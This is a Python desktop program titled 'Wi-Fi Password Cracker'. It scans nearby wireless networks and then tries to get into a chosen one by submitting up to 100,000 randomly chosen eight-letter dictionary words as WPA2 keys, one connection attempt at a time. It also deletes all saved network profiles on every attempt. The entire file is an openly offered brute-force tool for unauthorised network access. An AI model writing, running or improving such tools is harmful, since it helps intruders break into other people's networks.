import tkinter as tk
from tkinter import ttk
from tkinter import Text
import pywifi
from pywifi import const
import time
import random
import string
import nltk
from nltk.corpus import words

nltk.download('words')
word_list = set(words.words())

class WiFiPasswordCrackerApp(tk.Tk):
    def __init__(self):
        super().__init__()

        self.title("Wi-Fi Password Cracker")

        # Set window size
        self.geometry("400x250")

        self.selected_ssid = tk.StringVar()
        self.selected_ssid.set("Select Wi-Fi Network")

        self.password_label = tk.Label(self, text="Attempting to crack password...")
        self.password_label.pack(pady=10)

        self.password_prompt = tk.Label(self, text="", bg="black", fg="white")
        self.password_prompt.pack(fill=tk.X, padx=10)

        self.ssid_combobox = ttk.Combobox(self, textvariable=self.selected_ssid, state="readonly")
        self.ssid_combobox.pack(pady=5)

        self.scan_button = tk.Button(self, text="Scan Networks", command=self.scan_wifi)
        self.scan_button.pack(pady=5)

        self.connect_button = tk.Button(self, text="Connect", command=self.connect_to_wifi)
        self.connect_button.pack(pady=5)

        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0]  # Assuming there's only one wireless interface

    def scan_wifi(self):
        """
        Function to scan for available Wi-Fi networks and populate the combobox.
        """
        self.ssid_combobox['values'] = ()  # Clear existing values
        self.iface.scan()
        time.sleep(1)  # Wait for scan to complete
        networks = self.iface.scan_results()
        ssids = [network.ssid for network in networks]
        self.ssid_combobox['values'] = ssids

    def generate_password(self):
        """
        Function to generate a random password from dictionary words.
        """
        while True:
            word = random.choice(list(word_list))
            if len(word) == 8:
                return word

    def connect_to_wifi(self):
        """
        Function to attempt to connect to the selected Wi-Fi network using randomly generated passwords.
        """
        selected_ssid = self.selected_ssid.get()
        if not selected_ssid:
            return

        max_attempts = 100000
        for _ in range(max_attempts):
            password = self.generate_password()
            self.password_prompt.config(text=f"Trying password: {password}")
            self.update_idletasks()  # Update the GUI to show the new password
            if self._connect_to_wifi(selected_ssid, password):
                return

        self.password_label.config(text="Max attempts reached. Unable to connect.")

    def _connect_to_wifi(self, ssid, password):
        """
        Function to connect to a Wi-Fi network using the provided SSID and password.
        """
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)

        self.iface.connect(tmp_profile)
        time.sleep(5)  # Wait for connection attempt

        if self.iface.status() == const.IFACE_CONNECTED:
            self.password_label.config(text=f"Successfully connected to {ssid} using password: {password}")
            return True
        else:
            self.password_label.config(text=f"Failed to connect to {ssid} using password: {password}")
            return False

if __name__ == "__main__":
    app = WiFiPasswordCrackerApp()
    app.mainloop()
